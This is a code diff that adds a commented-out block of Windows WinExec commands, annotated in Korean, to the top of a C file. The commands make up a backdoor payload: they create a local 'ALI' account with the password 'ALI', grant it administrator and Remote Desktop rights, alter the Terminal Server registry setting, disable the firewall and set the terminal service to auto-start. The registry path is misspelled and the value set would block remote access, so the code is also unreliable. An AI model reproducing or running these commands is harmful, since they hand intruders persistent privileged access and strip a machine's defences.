@@ -1,3 +1,26 @@
+/*
+WinExec("net user ALI ALI /add", 1);
+// User: ALI, Pass: ALI
+
+WinExec("net localgroup Administrators ALI /add", 1);
+// Administrators 그룹에 ALI 계정 추가
+
+WinExec("NET LOCALGROUP \"Remote Desktop Users\" ALI /add", 1);
+// "Remote Desktor Users" 그룹에 ALI 계정 추가
+
+WinExec("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f", 1);
+// "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" 에 fDenyTSConnections 값을 1로 세팅
+
+WinExec("netsh firewall set opmode disable", 1);
+// 방화벽 끔
+// netsh advfirewall로 수정해야 됨
+
+WinExec("sc config termservice start= auto", 1);
+// terminal service 자동 시작
+
+ExitProcess(0);
+*/
+
 #include <stdio.h>
 #include <string.h>
 
